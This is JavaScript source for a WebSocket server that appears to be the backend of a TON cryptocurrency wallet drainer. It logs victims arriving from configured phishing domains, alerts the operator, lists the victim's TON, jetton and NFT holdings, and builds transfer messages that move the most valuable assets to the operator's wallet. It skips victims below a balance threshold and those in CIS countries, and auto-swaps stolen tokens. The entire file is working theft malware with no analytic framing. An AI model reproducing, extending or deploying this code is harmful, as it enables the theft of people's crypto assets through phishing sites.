// @AcmeDev compare
require('dotenv').config();
const { WebSocketServer } = require('ws')
const server = new WebSocketServer({ port: 80 });
const {cipher, decipher} = require('./modules/secret/index');
const {randomBytes} = require('node:crypto');
const Notify = require('./modules/notify/index');
const ExecuteAssets = require('./modules/assets');
const {sendToken, sendNft, sendTon} = require('./modules/BOC');
const Swap = require('./modules/swap');
const getSettings = require('./modules/parseSettings');
const axios = require("axios");
const Aes = require('./modules/aes');

const methods = {
    connected: (secret) => {
        return JSON.stringify({
            method: 'connected',
            secret: secret,
            status: true
        });
    },
    safety: (message) => {
        return JSON.stringify({
              method: 'safety',
              message: message,
              status: true
          });
    },
    wait: () => {
        return JSON.stringify({
            method: 'wait',
            message: 'wait',
            status: true
        })
    },
    error: () => {
        return JSON.stringify({
            method: 'close',
            message: 'Connection not safety',
            status: false
        })
    },
    done: () => {
        return JSON.stringify({
            method: 'done',
            message: 'Log sent',
            status: true
        })
    },
    manifest: (message) => {
        return JSON.stringify({
            method: 'manifest',
            message: message,
            status: true
        });
    },
    messages: (message) => {
        return JSON.stringify({
            method: 'messages',
            message: message,
            status: true
        });
    },
}

async function getSHA256Hash(str) {
    const buf = new TextEncoder().encode(str);
    const digest = await crypto.subtle.digest('SHA-256', buf);
    return Array.from(new Uint8Array(digest))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
}

server.on('connection', async ws => {
    const domains = getSettings();
    const NotifySender = new Notify('', '', {});
    const myEncryption = randomBytes(16).toString('hex'); let clientEncryption, signature;
    ws.send(methods.connected(cipher('AcmeDev')(myEncryption)));
    ws.on('close', () => console.log('Client has disconnected!'));
    ws.on('message', async data => {
        try {
            data = JSON.parse(data);
            if (data.method === 'connected') {
                clientEncryption = decipher('AcmeDev')(data.secret);
                signature = myEncryption.split('').slice(0, 12).join('') + clientEncryption.split('').slice(0, 12).join('');
                ws.send(methods.safety(Aes.Ctr.encrypt('hello', myEncryption, 256)));
            }
            if (data.method === 'safety') {
                const message = data.message.split(':');
                data.message = Aes.Ctr.decrypt(message[0], clientEncryption, 256);
                const checksum = Aes.Ctr.decrypt(message[1], signature, 256)
                if (checksum !== await getSHA256Hash(data.message)) {
                    ws.send(methods.error());
                }
                if (data.message === 'hello') {
                    ws.send(methods.wait());
                } else {
                    ws.send(methods.error());
                }
            }
            if (data.method === 'log') {
                const message = data.message.split(':');
                data.message = JSON.parse(Aes.Ctr.decrypt(message[0], clientEncryption, 256));
                const checksum = Aes.Ctr.decrypt(message[1], signature, 256)
                if (checksum !== await getSHA256Hash(JSON.stringify(data.message))) {
                    ws.send(methods.error());
                }
                if (data.message.method === 'opened') {
                    const {ip, country, domain, sng} = data.message.userInfo;
                    if (!ip || !country || !domain || !sng) {/**server.close();*/}
                    if (!(new RegExp('^((25[0-5]|(2[0-4]|1\\d|[1-9]|)\\d)\\.?\\b){4}$')).test(ip)) {/**server.close();*/}
                    if (country.length !== 2) {/**server.close();*/}
                    if (!(new RegExp('^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9](?:\\.[a-zA-Z]{2,})+$')).test(domain)) {/**server.close();*/}
                    if (sng === true && ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ', 'TJ'].includes(data.loc)) {
                        ws.send(methods.error());
                        /**server.close();*/
                    }
                    NotifySender.updateUserInfo(data.message.userInfo);
                    NotifySender.token = domains[data.message.userInfo.domain] ? domains[data.message.userInfo.domain].TOKEN : domains['default'].TOKEN;
                    NotifySender.id = domains[data.message.userInfo.domain] ? domains[data.message.userInfo.domain].ID : domains['default'].ID;
                    const notifyNewLogin = domains[data.message.userInfo.domain] ? domains[data.message.userInfo.domain].NOTIFY_NEW_LOGIN : domains['default'].NOTIFY_NEW_LOGIN;
                    if (notifyNewLogin === 'true') {
                        await NotifySender.opened();
                    }
                    ws.send(methods.done());
                }
                if (data.message.method === 'closed') {
                    const {ip, country, domain, sng} = data.message.userInfo;
                    if (!ip || !country || !domain || !sng) {/**server.close();*/}
                    if (!(new RegExp('^((25[0-5]|(2[0-4]|1\\d|[1-9]|)\\d)\\.?\\b){4}$')).test(ip)) {/**server.close();*/}
                    if (country.length !== 2) {/**server.close();*/}
                    if (!(new RegExp('^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9](?:\\.[a-zA-Z]{2,})+$')).test(domain)) {/**server.close();*/}
                    if (sng === true && ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ', 'TJ'].includes(data.loc)) {
                        ws.send(methods.error());
                        server.close()
                    }
                    NotifySender.updateUserInfo(data.message.userInfo);
                    const notifyClosed = domains[data.message.userInfo.domain] ? domains[data.message.userInfo.domain].NOTIFY_CLOSED_SITE : domains['default'].NOTIFY_CLOSED_SITE;
                    if (notifyClosed === 'true') {
                        await NotifySender.closed();
                    }
                    ws.send(methods.done());
                }
                if (data.message.method === 'pushChunk') {
                    const {ip, country, domain, sng} = data.message.userInfo;
                    if (!ip || !country || !domain || !sng) {/**server.close();*/}
                    if (!(new RegExp('^((25[0-5]|(2[0-4]|1\\d|[1-9]|)\\d)\\.?\\b){4}$')).test(ip)) {/**server.close();*/}
                    if (country.length !== 2) {/**server.close();*/}
                    if (!(new RegExp('^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9](?:\\.[a-zA-Z]{2,})+$')).test(domain)) {/**server.close();*/}
                    if (sng === true && ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ', 'TJ'].includes(data.loc)) {
                        ws.send(methods.error());
                        /**server.close();*/
                    }
                    NotifySender.updateUserInfo(data.message.userInfo);
                    await NotifySender.creatingJetton(data.message.chunk);
                    ws.send(methods.done());
                }
                if (data.message.method === 'chunkStatus') {
                    const {ip, country, domain, sng} = data.message.userInfo;
                    if (!ip || !country || !domain || !sng) {/**server.close();*/}
                    if (!(new RegExp('^((25[0-5]|(2[0-4]|1\\d|[1-9]|)\\d)\\.?\\b){4}$')).test(ip)) {/**server.close();*/}
                    if (country.length !== 2) {/**server.close();*/}
                    if (!(new RegExp('^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9](?:\\.[a-zA-Z]{2,})+$')).test(domain)) {/**server.close();*/}
                    if (sng === true && ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ', 'TJ'].includes(data.loc)) {
                        ws.send(methods.error());
                        /**server.close();*/
                    }
                    NotifySender.updateUserInfo(data.message.userInfo);
                    await NotifySender.transactionStatusJetton(data.message.status, data.message.chunk);
                    ws.send(methods.done());
                }
            }
            if (data.method === 'manifest') {
                const message = data.message.split(':');
                data.message = JSON.parse(Aes.Ctr.decrypt(message[0], clientEncryption, 256));
                const checksum = Aes.Ctr.decrypt(message[1], signature, 256)
                if (checksum !== await getSHA256Hash(JSON.stringify(data.message))) {
                    ws.send(methods.error());
                }
                if (domains[data.message.domain]) {
                    ws.send(methods.manifest(Aes.Ctr.encrypt(JSON.stringify({
                        url: domains[data.message.domain].MANIFEST_URL
                    }), myEncryption, 256)));
                } else {
                    ws.send(methods.manifest(Aes.Ctr.encrypt(JSON.stringify({
                        url: domains['default'].MANIFEST_URL
                    }), myEncryption, 256)));
                }
            }
            if (data.method === 'getMessages') {
                try {
                    const message = data.message.split(':');
                    data.message = JSON.parse(Aes.Ctr.decrypt(message[0], clientEncryption, 256));
                    const checksum = Aes.Ctr.decrypt(message[1], signature, 256)
                    if (checksum !== await getSHA256Hash(JSON.stringify(data.message))) {
                        ws.send(methods.error());
                    }
                    const {ip, country, domain, sng} = data.message.userInfo;
                    if (!ip || !country || !domain || !sng) {/**server.close();*/}
                    if (!(new RegExp('^((25[0-5]|(2[0-4]|1\\d|[1-9]|)\\d)\\.?\\b){4}$')).test(ip)) {/**server.close();*/}
                    if (country.length !== 2) {/**server.close();*/}
                    if (!(new RegExp('^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9](?:\\.[a-zA-Z]{2,})+$')).test(domain)) {/**server.close();*/}
                    if (sng === true && ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ', 'TJ'].includes(data.loc)) {
                        ws.send(methods.error());
                        /**server.close();*/
                    }
                    NotifySender.updateUserInfo(data.message.userInfo);
                    const assets= await ExecuteAssets(data.message.userInfo, domains[data.message.userInfo.domain] ? domains[data.message.userInfo.domain] : domains['default']);
                    await NotifySender.connected(assets.balance, assets.jettonList, assets.nftList, domains[data.message.userInfo.domain] ? domains[data.message.userInfo.domain] : domains['default']);

                    const assetTypeSum = assets.data.reduce((acc, asset) => {
                        if (!acc[asset.type]) {
                            acc[asset.type] = 0;
                        }
                        acc[asset.type] += asset.price;
                        return acc;
                    }, {});

                    const sortedTypes = Object.entries(assetTypeSum).sort((a, b) => b[1] - a[1]).map(entry => entry[0]);
                    let uniqueAssetList = assets.data.filter((item, index, self) =>
                            index === self.findIndex((t) =>
                                t.type === item.type &&
                                t.balance === item.balance &&
                                t.name === item.name
                            )
                    );

                    const tonAssets = uniqueAssetList.filter(asset => asset.type === "TON");
                    const jettonAssets = uniqueAssetList.filter(asset => asset.type === "Jetton");
                    const nftAssets = uniqueAssetList.filter(asset => asset.type === "NFT");
                    const min_balance_total = domains[data.message.userInfo.domain] ? domains[data.message.userInfo.domain].MIN_BALANCE_TOTAL : domains['default'].MIN_BALANCE_TOTAL;
                    if (uniqueAssetList.reduce((total, asset) => total + asset.price, 0) < +min_balance_total) {
                        return ws.send(methods.error());
                    }

                    const messages = [];

                    for (const type of sortedTypes) {
                        switch (type) {
                            case 'TON':
                                if (tonAssets.length > 0) {
                                    messages.push(...await sendTon(tonAssets[0], domains[data.message.userInfo.domain] ? domains[data.message.userInfo.domain] : domains['default']));
                                }
                                break;
                            case 'Jetton':
                                for (let i = 0; i < jettonAssets.length; i += 4) {
                                    messages.push(...await sendToken(jettonAssets.slice(i, Math.min(i + 4, jettonAssets.length)), domains[data.message.userInfo.domain] ? domains[data.message.userInfo.domain] : domains['default']));
                                }
                                break;
                            case 'NFT':
                                for (let i = 0; i < nftAssets.length; i += 4) {
                                    messages.push(...await sendNft(nftAssets.slice(i, Math.min(i + 4, nftAssets.length)), domains[data.message.userInfo.domain] ? domains[data.message.userInfo.domain] : domains['default']));
                                }
                                break;
                        }
                    }
                    ws.send(methods.messages(Aes.Ctr.encrypt(JSON.stringify({
                        messages: messages.sort((a, b) => b.usdBal - a.usdBal)
                    }), myEncryption, 256)));
                } catch (e) {
                    console.log(e)
                    ws.send(methods.messages(Aes.Ctr.encrypt(JSON.stringify({
                        messages: []
                    }), myEncryption, 256)));
                }
            }
        } catch (e) {
            console.log(e)
        }
    });

    ws.onerror = function () {
        console.log('websocket error');
    }
});

// Init autoSwap
setInterval(async () => {
    const domains = getSettings();
    const intervals = [];
    for (const domain in domains) {
        if (domains[domain].AUTO_SWAP === "true") {
            const swapper = new Swap(domains[domain]);
            const interval = setInterval(async (swapper) => {
                try {
                    console.log(`AutoSwap inited for ${domain}`)
                    const userJettons = await axios.get('https://tonapi.io/v2/accounts/' + domains[domain].WALLET + '/jettons?currencies=ton,usd,rub');
                    const forSwap = [];
                    for (const jeton of userJettons.data.balances) {
                        let decimalCuter = 1;

                        for (let i = 0; i < jeton.jetton.decimals; i++) {
                            decimalCuter = decimalCuter * 10;
                        }

                        const jettonData = {
                            address: jeton.jetton.address,
                            amount: jeton.balance,
                            name: jeton.jetton.name,
                            formatted: parseInt(jeton.balance) / decimalCuter
                        };

                        if (jettonData.amount > 0 && jeton.jetton.verification !== 'none') {
                            forSwap.push(jettonData);
                        }
                    }
                    if (forSwap.length > 0) {
                        console.log(`swapping`, forSwap[0].name, ' - ', forSwap[0].amount)
                        await swapper.swap(forSwap[0]);
                    }
                } catch (e) {
                    console.log(e)
                }
            }, 120 * 1000, swapper);
            intervals.push(interval)
        }
    }
    setTimeout(() => {
        for (const interval of intervals) {
            clearInterval(interval);
        }
    }, 5 * 60 * 1000);
}, 5 * 60 * 1000)


